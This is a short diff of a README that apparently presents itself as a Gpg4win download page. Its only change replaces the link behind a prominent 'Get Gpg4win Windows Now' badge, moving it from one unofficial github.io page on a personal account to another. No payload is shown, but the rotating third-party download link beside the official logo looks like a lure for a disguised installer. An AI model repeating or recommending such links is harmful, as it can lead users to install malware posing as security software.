@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/d/d6/Gpg4win-logo.png)
 
-[![Get Gpg4win Windows Now](https://img.shields.io/badge/Get_Gpg4win_Windows-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/gpg4win)
+[![Get Gpg4win Windows Now](https://img.shields.io/badge/Get_Gpg4win_Windows-Now-0a5d8d?style=for-the-badge&logo=github)](https://cairohicksnqqo.github.io/.github/gpg4win)
 
 ---
 
